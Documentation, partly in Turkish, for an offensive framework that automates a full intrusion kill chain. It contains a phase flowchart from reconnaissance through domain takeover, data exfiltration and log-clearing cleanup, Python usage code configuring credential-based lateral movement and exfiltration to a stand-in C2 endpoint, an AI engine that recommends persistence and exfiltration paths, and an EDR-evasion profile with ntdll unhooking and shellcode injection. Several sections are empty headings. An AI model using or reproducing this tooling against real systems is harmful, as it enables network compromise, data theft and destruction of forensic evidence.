# Full Kill Chain Documentation

Bu dokümantasyon, tam kill chain orkestrasyon sisteminin mimarisini ve kullanımını açıklar.

## Kill Chain Phases

```mermaid
flowchart TB
    subgraph PHASE1["🔍 PHASE 1: RECONNAISSANCE"]
        direction TB
        R1[Port Scanning]
        R2[AD Enumeration]
        R3[Service Discovery]
        R4[User Enumeration]
        R5[Share Enumeration]
        
        R1 --> R2
        R2 --> R3
        R3 --> R4
        R4 --> R5
    end
    
    subgraph PHASE2["🎯 PHASE 2: INITIAL ACCESS"]
        direction TB
        I1{Credential<br/>Available?}
        I2[WMIExec]
        I3[PSExec]
        I4[SMBExec]
        I5[Exploit/Phishing]
        I6((Foothold<br/>Established))
        
        I1 -->|Yes| I2
        I1 -->|Yes| I3
        I1 -->|Yes| I4
        I1 -->|No| I5
        I2 --> I6
        I3 --> I6
        I4 --> I6
        I5 --> I6
    end
    
    subgraph PHASE3["🔒 PHASE 3: PERSISTENCE"]
        direction TB
        P1{OS Type?}
        P2[Scheduled Task]
        P3[Registry Run]
        P4[WMI Subscription]
        P5[Cron Job]
        P6[Systemd Service]
        P7[SSH Key]
        P8((Persistence<br/>Installed))
        
        P1 -->|Windows| P2
        P1 -->|Windows| P3
        P1 -->|Windows| P4
        P1 -->|Linux| P5
        P1 -->|Linux| P6
        P1 -->|Linux| P7
        P2 --> P8
        P3 --> P8
        P4 --> P8
        P5 --> P8
        P6 --> P8
        P7 --> P8
    end
    
    subgraph PHASE4["⬆️ PHASE 4: PRIVILEGE ESCALATION"]
        direction TB
        PE1[Credential Dump]
        PE2[Token Impersonation]
        PE3[UAC Bypass]
        PE4[Kernel Exploit]
        PE5[Sudo Abuse]
        PE6((Admin/Root<br/>Access))
        
        PE1 --> PE6
        PE2 --> PE6
        PE3 --> PE6
        PE4 --> PE6
        PE5 --> PE6
    end
    
    subgraph PHASE5["↔️ PHASE 5: LATERAL MOVEMENT"]
        direction TB
        L1[Target Discovery]
        L2[Credential Reuse]
        L3[Pass-the-Hash]
        L4[Kerberoasting]
        L5[DCSync]
        L6{More<br/>Targets?}
        L7((Domain<br/>Dominance))
        
        L1 --> L2
        L2 --> L3
        L3 --> L4
        L4 --> L5
        L5 --> L6
        L6 -->|Yes| L1
        L6 -->|No| L7
    end
    
    subgraph PHASE6["📦 PHASE 6: COLLECTION"]
        direction TB
        C1[Credential Harvesting]
        C2[File Collection]
        C3[Database Extraction]
        C4[Memory Dump]
        C5[Config Files]
        C6[Encrypt & Stage]
        
        C1 --> C6
        C2 --> C6
        C3 --> C6
        C4 --> C6
        C5 --> C6
    end
    
    subgraph PHASE7["📤 PHASE 7: EXFILTRATION"]
        direction TB
        E1{Network<br/>Restricted?}
        E2[HTTPS POST]
        E3[Cloud Storage]
        E4[DNS Tunnel]
        E5[ICMP Tunnel]
        E6((Data<br/>Exfiltrated))
        
        E1 -->|No| E2
        E1 -->|No| E3
        E1 -->|Yes| E4
        E1 -->|Yes| E5
        E2 --> E6
        E3 --> E6
        E4 --> E6
        E5 --> E6
    end
    
    subgraph PHASE8["🧹 PHASE 8: CLEANUP"]
        direction TB
        CL1[Clear Event Logs]
        CL2[Remove Artifacts]
        CL3[Timestomp Files]
        CL4[Remove Tools]
        CL5((Clean<br/>Exit))
        
        CL1 --> CL2
        CL2 --> CL3
        CL3 --> CL4
        CL4 --> CL5
    end
    
    %% Main Flow
    PHASE1 --> PHASE2
    PHASE2 --> PHASE3
    PHASE3 --> PHASE4
    PHASE4 --> PHASE5
    PHASE5 --> PHASE6
    PHASE6 --> PHASE7
    PHASE7 --> PHASE8
    
    %% Styling
    style PHASE1 fill:#e3f2fd,stroke:#1976d2
    style PHASE2 fill:#fff3e0,stroke:#f57c00
    style PHASE3 fill:#f3e5f5,stroke:#7b1fa2
    style PHASE4 fill:#e8f5e9,stroke:#388e3c
    style PHASE5 fill:#fce4ec,stroke:#c2185b
    style PHASE6 fill:#fff8e1,stroke:#fbc02d
    style PHASE7 fill:#e0f2f1,stroke:#00897b
    style PHASE8 fill:#efebe9,stroke:#5d4037
```



## Chain State Machine


## Persistence Methods Decision Tree


## Exfiltration Path Selection


## RQ Job Workflow


## Cleanup Operations


## API Endpoints

| Endpoint | Method | Description |
|----------|--------|-------------|
| `/api/chain/create` | POST | Create new chain |
| `/api/chain/{id}/start` | POST | Start chain execution |
| `/api/chain/{id}/status` | GET | Get chain status |
| `/api/chain/{id}/abort` | POST | Abort running chain |
| `/api/chain/{id}/pause` | POST | Pause running chain |
| `/api/chain/{id}/resume` | POST | Resume paused chain |
| `/api/chain/{id}/diagram` | GET | Get Mermaid diagram |
| `/api/chain/list` | GET | List all chains |

## Usage Example

```python
from cybermodules.full_chain_orchestrator import (
    FullChainOrchestrator,
    ChainConfig,
    ChainPhase
)
from cybermodules.chain_workers import ChainJobWorker

# Create chain configuration
config = ChainConfig(
    name="Domain Takeover Operation",
    initial_target="192.168.1.100",
    target_domain="corp.local",
    credentials={
        'username': 'admin',
        'password': 'password123',
        'domain': 'CORP'
    },
    
    # Enable phases
    enable_recon=True,
    enable_persistence=True,
    enable_lateral=True,
    enable_exfil=True,
    enable_cleanup=True,
    
    # Persistence options
    persistence_methods=['scheduled_task', 'wmi_subscription'],
    
    # Lateral movement
    lateral_max_depth=3,
    lateral_max_hosts=10,
    lateral_methods=['wmiexec', 'psexec'],
    
    # Exfiltration
    exfil_method='https',
    exfil_endpoint='https://c2.example.com/upload',
    
    # Options
    ai_guided=True,
    opsec_mode=True,
    evasion_profile='stealth'
)

# Option 1: Direct execution
orchestrator = FullChainOrchestrator(scan_id=123)
chain_id = orchestrator.create_chain(config)
result = orchestrator.execute()

# Option 2: RQ job execution
worker = ChainJobWorker()
job_id = worker.submit_chain(config.__dict__, scan_id=123)

# Check status
status = worker.get_job_status(job_id)

# Abort if needed
worker.abort_chain(job_id, reason="Detection risk")

# Resume later
worker.submit_chain_with_resume(chain_id)
```

## AI Integration

```python
from cybermodules.ai_post_exploit import AIPostExploitEngine

# Initialize AI engine
ai = AIPostExploitEngine(scan_id=123)

# Feed chain logs
chain_log = {
    'compromised_hosts': ['192.168.1.100', '192.168.1.101'],
    'credentials': [{'user': 'admin', 'hash': 'aad3b435...'}],
    'persistence': ['scheduled_task'],
    'current_phase': 'lateral_movement'
}

analysis = ai.feed_chain_log(chain_log)

# Get persistence recommendations
persist_recs = ai.recommend_persistence(
    os_type='windows',
    current_access='admin',
    stealth_required=True
)

# Get exfil path recommendations
exfil_recs = ai.recommend_exfil_path(
    data_volume='medium',
    network_restrictions=False
)
```

## Configuration Files

### Evasion Profile (configs/evasion_profile_stealth.yaml)

```yaml
name: stealth
description: Maximum stealth configuration

syscalls:
  technique: indirect
  unhook_ntdll: true
  
obfuscation:
  level: standard
  string_encryption: true
  control_flow: true
  
sleep:
  technique: ekko
  jitter: 30
  
injection:
  technique: syscall_shellcode
  target: explorer.exe
```

---

*Bu dokümantasyon sadece yetkili penetrasyon testleri ve güvenlik araştırmaları içindir.*
